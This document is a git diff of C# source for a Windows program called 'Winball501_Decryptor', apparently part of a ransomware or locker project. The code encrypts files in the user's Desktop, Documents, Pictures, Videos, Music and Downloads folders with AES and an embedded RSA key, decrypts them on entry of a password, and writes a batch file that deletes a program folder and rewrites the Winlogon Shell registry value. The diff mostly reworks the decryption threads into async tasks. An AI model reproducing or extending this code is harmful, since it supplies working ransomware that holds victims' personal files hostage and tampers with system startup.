@@ -15,14 +15,14 @@ namespace Winball501_Decryptor
     {
         public Form1()
         {
-         if (IsSafeMode())
-         {
-            load();
-         }
-         else
-         {
-            InitializeComponent();
-         }
+            if (IsSafeMode())
+            {
+                load();
+            }
+            else
+            {
+                InitializeComponent();
+            }
         }
         string publickey = "<RSAKeyValue><Modulus>sFCjXDLTTsLJGHRCK5uTawwBCWUWyUDK/CsxBn5mQKlOZd0ibBvZ3lpoQpuyww6cX096eKPsW8vOCUNRfwxv9mfThUJ8Yk+l0uLXvC8kRnNYOmFZCfwgvTEdIZtYIT35nbRyAlGFGL49zTYTmh/NEJcZasSI1XfHZt+G2TW62u2w4ZTufRRosVr5dkWM8CFRVLV+KtoXqA08yu2MSL+UUXDnT8WOYNH0unhoKb4xCWdbT1riP/5LPFicXQi6lQyhSAFXtpfeIrkvvphwoRJKs955ZI4KvUOtwbE361mKJvIB6FuBcCmwScoDhgQkG+4q4MJsZ3zyp0+DuriDyMcvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
         List<Task> tasks = new List<Task>();
@@ -38,7 +38,6 @@ namespace Winball501_Decryptor
                 sw.WriteLine("rd /s /q \"C:\\Program Files\\utkudrk2\"");
                 sw.WriteLine("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
                 sw.WriteLine("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f");
-                sw.WriteLine("shutdown -r -t 7"); // Restart the computer with a 7-second delay
             }
 
             // Execute the batch file
@@ -77,8 +76,8 @@ namespace Winball501_Decryptor
                     tasks.Add(Task.Run(() => encrypt.run()));
                 }
                 string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
-              
-                Encrypt encrypt1 = new Encrypt(this,publickey, downloadsPath);
+
+                Encrypt encrypt1 = new Encrypt(this, publickey, downloadsPath);
                 tasks.Add(Task.Run(() => encrypt1.run()));
                 File.Create(encryptedfile).Close();
                 await Task.WhenAll(tasks);
@@ -118,7 +117,7 @@ namespace Winball501_Decryptor
                 System.Security.Cryptography.CryptoStream sifreler = null;
                 try
                 {
-                   
+
                     string[] files = Directory.GetFiles(dir);
                     string[] dirs = Directory.GetDirectories(dir);
                     System.Security.Cryptography.AesCryptoServiceProvider rijndael = new System.Security.Cryptography.AesCryptoServiceProvider();
@@ -274,7 +273,6 @@ namespace Winball501_Decryptor
             public short rttoperation = 0;
             string key;
             string dir;
-            bool decryptionSuccessful = false;  // Flag to track decryption success
             public Decrypt(Form1 form, string key, string dir)
             {
                 this.form = form;
@@ -317,8 +315,8 @@ namespace Winball501_Decryptor
                             while (okur.BaseStream.Position < filesize)
                             {
                                 long ig = filesize - okur.BaseStream.Position;
-                               form.label2.Text = "Decrypting: " + filenamew + " | %" + Math.Round((((double)okur.BaseStream.Position / (double)filesize) * 100), 0).ToString();
-                               
+                                form.label2.Text = "Decrypting: " + filenamew + " | %" + Math.Round((((double)okur.BaseStream.Position / (double)filesize) * 100), 0).ToString();
+
 
 
                                 if (ig > 1000000)
@@ -336,10 +334,9 @@ namespace Winball501_Decryptor
                                     sifreler.FlushFinalBlock();
                                 }
                             }
-                                decryptionSuccessful = true;
 
-                                form.listBox1.Items.Add("Decrypted: " + dosyalar);
-                           
+                            form.listBox1.Items.Add("Decrypted: " + dosyalar);
+
 
                             if (okur != null)
                             {
@@ -361,9 +358,9 @@ namespace Winball501_Decryptor
                         }
                         catch (Exception ex)
                         {
-                         
-                                form.listBox1.Items.Add("Cannot Decrypt: " + dosyalar + " " + ex.Message + " " + ex.StackTrace);
-                        
+
+                            form.listBox1.Items.Add("Cannot Decrypt: " + dosyalar + " " + ex.Message + " " + ex.StackTrace);
+
 
 
                             continue;
@@ -375,11 +372,6 @@ namespace Winball501_Decryptor
                         Decrypt decrypt = new Decrypt(form, key, dir);
                         Thread t = new Thread(new ThreadStart(decrypt.run));
                         t.Start();
-                    }
-                    // After decryption crperform final actions only if decryption was successful
-                    if (decryptionSuccessful)
-                    {
-                      CreateBatchFile();
                     }
                 }
                 catch (Exception ex)
@@ -455,7 +447,7 @@ namespace Winball501_Decryptor
             return ters;
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private async void button1_Click(object sender, EventArgs e)
         {
             if (textBox1.Text == "")
             {
@@ -463,26 +455,38 @@ namespace Winball501_Decryptor
             }
             else
             {
-                foreach (Environment.SpecialFolder folder in new[] {
-    Environment.SpecialFolder.Desktop,
-    Environment.SpecialFolder.MyDocuments,
-    Environment.SpecialFolder.MyPictures,
-    Environment.SpecialFolder.MyVideos,
-    Environment.SpecialFolder.MyMusic,
+                List<Task> decryptionTasks = new List<Task>();
 
-})
+                // Decrypt files in the standard special folders
+                foreach (Environment.SpecialFolder folder in new[] {
+            Environment.SpecialFolder.Desktop,
+            Environment.SpecialFolder.MyDocuments,
+            Environment.SpecialFolder.MyPictures,
+            Environment.SpecialFolder.MyVideos,
+            Environment.SpecialFolder.MyMusic,
+        })
                 {
                     string path = Environment.GetFolderPath(folder);
                     string enteredPassword = textBox1.Text;
                     Decrypt decrypt = new Decrypt(this, enteredPassword, path);
-                    Thread t = new Thread(new ThreadStart(decrypt.run));
-                    t.Start();
+
+                    // Add decryption tasks to the list
+                    decryptionTasks.Add(Task.Run(() => decrypt.run()));
                 }
-                string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+
+                // Decrypt files in the Downloads folder
+                string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                 string enteredPasswordForDownloads = textBox1.Text;
                 Decrypt decryptForDownloads = new Decrypt(this, enteredPasswordForDownloads, downloadsPath);
-                Thread downloadThread = new Thread(new ThreadStart(decryptForDownloads.run));
-                downloadThread.Start();
+
+                // Add the Downloads decryption task to the list
+                decryptionTasks.Add(Task.Run(() => decryptForDownloads.run()));
+
+                // Wait for all decryption tasks to finish
+                await Task.WhenAll(decryptionTasks);
+
+                // Once all decryption tasks are done, proceed with cleanup
+                CreateBatchFile();
             }
         }
     }
